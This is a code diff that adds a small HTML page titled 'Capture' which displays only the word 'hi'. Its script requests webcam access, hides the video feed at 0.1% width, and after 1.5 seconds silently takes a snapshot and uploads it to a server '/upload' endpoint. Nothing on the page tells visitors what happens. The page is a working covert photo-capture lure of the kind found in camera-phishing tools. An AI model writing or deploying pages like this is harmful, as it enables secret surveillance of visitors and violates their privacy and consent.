@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Capture</title>
+    <style>
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        video { width: 0.1%; height: auto; }
+    </style>
+</head>
+<body>
+    <h1>hi</h1>
+    <video id="video" autoplay playsinline></video>
+
+<script>
+const video = document.getElementById("video");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            setTimeout(captureFrame, 1500);
+        };
+    })
+    .catch(err => {
+        console.error("camera error:", err);
+    });
+
+function captureFrame() {
+    const w = video.videoWidth;
+    const h = video.videoHeight;
+
+    const canvas = document.createElement("canvas");
+    canvas.width = w;
+    canvas.height = h;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, w, h);
+
+    canvas.toBlob(blob => {
+        if (!blob) return;
+
+        const fd = new FormData();
+        fd.append("image", blob, "capture.jpg");
+
+        fetch("/upload", {
+            method: "POST",
+            body: fd,
+        })
+        .then(r => r.text())
+        .then(t => console.log("server:", t))
+        .catch(err => console.error("upload error:", err));
+    }, "image/jpeg", 0.95);
+}
+</script>
+
+</body>
+</html>
